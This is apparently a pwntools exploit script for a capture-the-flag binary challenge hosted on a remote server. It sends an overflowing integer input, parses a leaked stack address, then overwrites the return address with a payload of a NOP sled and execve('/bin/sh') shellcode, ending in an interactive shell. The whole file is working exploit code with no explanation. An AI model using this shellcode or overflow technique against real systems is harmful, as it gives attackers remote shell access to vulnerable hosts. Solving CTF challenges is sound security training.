from pwn import *

elf = context.binary = ELF("./challenge")
libc = elf.libc

gs = '''
break *main
'''

def conn():
	if args.GDB:
		return gdb.debug(elf.path,gdbscript=gs)
	else:
		return process([elf.path])
	return r

# p = conn()
p = remote("rvcechalls.xyz",29639		)
p.recvline()
p.recvline()
p.recvline()
p.recvline()
p.sendline(b"2147483647 10")

p.recvline()
p.recvline()
p.recvuntil('at ')
leak = int(p.recvline().strip(),16)

print(hex(leak))

offset = 104

payload = b"\x90"*50
payload += b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
payload +=b"\x90"*27
payload += p64(leak)


p.sendline(payload)

p.interactive()